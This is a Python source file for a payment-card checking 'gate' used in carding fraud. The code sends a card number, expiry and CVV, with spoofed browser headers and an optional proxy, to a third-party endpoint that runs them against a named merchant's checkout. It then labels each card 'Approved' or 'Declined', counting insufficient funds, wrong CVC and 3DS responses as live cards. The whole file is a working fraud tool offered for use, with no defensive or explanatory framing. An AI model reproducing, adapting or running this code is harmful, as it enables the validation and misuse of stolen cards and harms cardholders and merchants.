import aiohttp
import asyncio
import json
import re

async def vi_gate(cc, mes, ano, cvv, proxy_config=None):
    try:
        cc_line = f"{cc}|{mes}|{ano}|{cvv}"
        
        headers = {
            'authority': 'endpoints.syrunex.site',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
        }
        
        params = {
            'cc': cc_line,
            'site': 'https://www.provencebeauty.com',
        }
        
        if proxy_config:
            proxy_url = f"http://{proxy_config['user']}:{proxy_config['pass']}@{proxy_config['host']}"
        else:
            proxy_url = None
        
        async with aiohttp.ClientSession() as session:
            try:
                async with session.get(
                    'https://endpoints.syrunex.site/freee/shopiee.php',
                    headers=headers,
                    params=params,
                    proxy=proxy_url,
                    timeout=aiohttp.ClientTimeout(total=60)
                ) as response:
                    text = await response.text()
                    
                    try:
                        data = json.loads(text)
                        message = data.get('message', 'Unknown')
                        amount = data.get('amount', data.get('price', data.get('total', 'N/A')))
                        
                        if amount == 'N/A' or not amount:
                            amount_match = re.search(r'[\$\€\£]?\d+\.?\d*', message)
                            if amount_match:
                                amount = amount_match.group()
                            else:
                                amount = 'N/A'
                        
                        if 'ORDER_PLACED' in message or 'Charged' in message:
                            return "Approved ✅", f"Charged - {amount}"
                        elif 'ORDER_PLACED' in message:
                            return "Approved ✅", f"Order Placed - {amount}"
                        elif 'INSUFFICIENT_FUNDS' in message or 'insufficient' in message.lower():
                            return "Approved ✅", f"Low Funds - {amount}"
                        elif '3DS_REQUIRED' in message:
                            return "Approved ✅", f"3DS Required - {amount}"
                        elif 'INVALID_CVC' in message or 'INCORRECT_CVC' in message:
                            return "Approved ✅", f"Invalid CVC - {amount}"
                        elif 'INCORRECT_ZIP' in message:
                            return "Approved ✅", f"Incorrect ZIP - {amount}"
                        elif 'INCORRECT_PIN' in message:
                            return "Approved ✅", f"Incorrect PIN - {amount}"
                        elif 'CAPTCHA_REQUIRED' in message:
                            return "Declined ❌", f"CARD_DECLINED - Captcha Required - {amount}"
                        elif 'CARD_DECLINED' in message or 'card_declined' in message.lower():
                            return "Declined ❌", f"CARD_DECLINED - {amount}"
                        elif 'approved' in message.lower() or 'success' in message.lower():
                            return "Approved ✅", f"Success - {amount}"
                        elif 'declined' in message.lower():
                            return "Declined ❌", f"CARD_DECLINED - {amount}"
                        else:
                            return "Declined ❌", f"CARD_DECLINED - {amount}"
                            
                    except json.JSONDecodeError:
                        amount_match = re.search(r'[\$\€\£]?\d+\.?\d*', text)
                        amount = amount_match.group() if amount_match else 'N/A'
                        
                        if 'ORDER_PLACED' in text or 'Charged' in text:
                            return "Approved ✅", f"Charged - {amount}"
                        elif 'ORDER_PLACED' in text:
                            return "Approved ✅", f"Order Placed - {amount}"
                        elif 'INSUFFICIENT_FUNDS' in text or 'insufficient' in text.lower():
                            return "Approved ✅", f"Low Funds - {amount}"
                        elif '3DS_REQUIRED' in text:
                            return "Approved ✅", f"3DS Required - {amount}"
                        elif 'INVALID_CVC' in text or 'INCORRECT_CVC' in text:
                            return "Approved ✅", f"Invalid CVC - {amount}"
                        elif 'INCORRECT_ZIP' in text:
                            return "Approved ✅", f"Incorrect ZIP - {amount}"
                        elif 'INCORRECT_PIN' in text:
                            return "Approved ✅", f"Incorrect PIN - {amount}"
                        elif 'CAPTCHA_REQUIRED' in text:
                            return "Declined ❌", f"CARD_DECLINED - Captcha Required - {amount}"
                        elif 'CARD_DECLINED' in text or 'card_declined' in text.lower():
                            return "Declined ❌", f"CARD_DECLINED - {amount}"
                        elif 'approved' in text.lower() or 'success' in text.lower():
                            return "Approved ✅", f"Success - {amount}"
                        elif 'declined' in text.lower():
                            return "Declined ❌", f"CARD_DECLINED - {amount}"
                        else:
                            return "Declined ❌", f"CARD_DECLINED - {amount}"
                        
            except asyncio.TimeoutError:
                return "Error ⚠️", "Request Timeout"
            except aiohttp.ClientError:
                return "Error ⚠️", "Connection Failed"
                
    except Exception as e:
        return "Error ⚠️", str(e)[:40]